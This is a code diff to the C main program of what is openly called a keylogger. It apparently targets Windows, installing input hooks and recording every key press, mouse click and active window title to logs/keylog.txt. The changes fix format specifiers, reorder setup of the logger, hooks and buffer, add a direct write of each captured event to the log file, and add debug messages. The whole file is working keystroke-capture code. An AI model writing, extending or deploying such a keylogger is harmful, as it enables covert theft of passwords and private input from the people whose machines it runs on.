@@ -8,7 +8,6 @@
 
 static volatile int running = 1;
 
-// Callback function for hook events
 static void event_callback(const Event* event) {
     if (!event) return;
     
@@ -17,17 +16,18 @@ static void event_callback(const Event* event) {
     char event_data[1024];
     switch(event->type) {
         case EVENT_KEY_PRESS:
-            printf("Key Press Detected: %u\n", event->data.keyboard.vkCode);
-            snprintf(event_data, sizeof(event_data), "Key Press: %u\n", 
+            printf("Key Press Detected: %lu\n", event->data.keyboard.vkCode);
+            snprintf(event_data, sizeof(event_data), "Key Press: %lu\n", 
                     event->data.keyboard.vkCode);
             break;
         case EVENT_MOUSE_CLICK:
-            printf("Mouse Click Detected: (%d, %d)\n",
+            printf("Mouse Click Detected: (%ld, %ld)\n",
                    event->data.mouse.position.x, event->data.mouse.position.y);
-            snprintf(event_data, sizeof(event_data), "Mouse Click: (%d, %d)\n", 
+            snprintf(event_data, sizeof(event_data), "Mouse Click: (%ld, %ld)\n", 
                     event->data.mouse.position.x, event->data.mouse.position.y);
             break;
         case EVENT_WINDOW_CHANGE:
+            printf("Window Change Detected: %s\n", event->data.window.title);
             snprintf(event_data, sizeof(event_data), "Window Change: %s\n", 
                     event->data.window.title);
             break;
@@ -35,7 +35,9 @@ static void event_callback(const Event* event) {
             return;
     }
     
+    // Add to buffer and write to log file
     add_to_buffer(event_data, strlen(event_data));
+    write_to_log(event_data, strlen(event_data));
 }
 
 void cleanup_handler(int signum) {
@@ -44,54 +46,72 @@ void cleanup_handler(int signum) {
 }
 
 int main() {
+    DWORD error;
+    char input;
+    
     printf("Keylogger starting...\n");
+    printf("[DEBUG] Setting up signal handlers...\n");
     signal(SIGINT, cleanup_handler);
     signal(SIGTERM, cleanup_handler);
 
-    // Initialize components
-    if (!init_hooks(event_callback)) { 
-        fprintf(stderr, "Failed to initialize hooks\n");
-        printf("[DEBUG] init_hooks failed\n");
+    // Create logs directory if it doesn't exist
+    if (!create_directory_if_needed("logs")) {
+        fprintf(stderr, "Failed to create logs directory\n");
         return 1;
     }
 
+    // Initialize logger
+    printf("[DEBUG] Initializing logger...\n");
+    if (!init_logger("logs/keylog.txt")) {
+        fprintf(stderr, "Failed to initialize logger\n");
+        return 1;
+    }
+    printf("[DEBUG] Logger initialized successfully\n");
+
+    // Initialize hooks
+    printf("[DEBUG] Initializing hooks...\n");
+    if (!init_hooks(event_callback)) { 
+        error = GetLastError();
+        fprintf(stderr, "Failed to initialize hooks (Error: %lu)\n", error);
+        cleanup_logger();
+        return 1;
+    }
+    printf("[DEBUG] Hooks initialized successfully\n");
+
+    // Initialize buffer
+    printf("[DEBUG] Initializing buffer...\n");
     if (!init_buffer()) {
         cleanup_hooks();
+        cleanup_logger();
         fprintf(stderr, "Failed to initialize buffer\n");
-        printf("[DEBUG] init_buffer failed\n");
         return 1;
     }
+    printf("[DEBUG] Buffer initialized successfully\n");
+    
+    // Wait for user input
+    printf("[DEBUG] Press Enter to start monitoring (or Ctrl+C to exit)...\n");
+    fflush(stdout);
+    input = getchar();
+    printf("[DEBUG] Received input: %d\n", input);
 
-    printf("[DEBUG] init_buffer succeeded. Press Enter to continue...\n");
-    getchar();
+    printf("[DEBUG] Starting main loop. Press Ctrl+C to exit.\n");
+    fflush(stdout);
 
-    if (!init_logger("logs/keylog.txt")) {
-        cleanup_buffer();
-        cleanup_hooks();
-        fprintf(stderr, "Failed to initialize logger\n");
-        printf("[DEBUG] init_logger failed\n");
-        return 1;
-    }
-
-    printf("[DEBUG] init_logger succeeded. Press Enter to continue...\n");
-    getchar();
-    printf("Keylogger started. Press Ctrl+C to exit.\n");
-
+    // Main loop with more debug output
     while (running) {
-        printf("[DEBUG] Keylogger running...\n");
+        printf("[DEBUG] Processing events...\n");
+        fflush(stdout);
         if (!process_events()) {
-            printf("[DEBUG] process_events returned false\n");
-        } else {
-            printf("[DEBUG] Events processed successfully\n");
+            printf("[DEBUG] Error processing events\n");
         }
-        flush_buffer_if_needed();
-        Sleep(10);
+        Sleep(100);
     }
 
-    printf("\nShutting down...\n");
+    printf("[DEBUG] Cleaning up...\n");
     cleanup_logger();
     cleanup_buffer();
     cleanup_hooks();
+    printf("[DEBUG] Cleanup complete\n");
 
     return 0;
 }
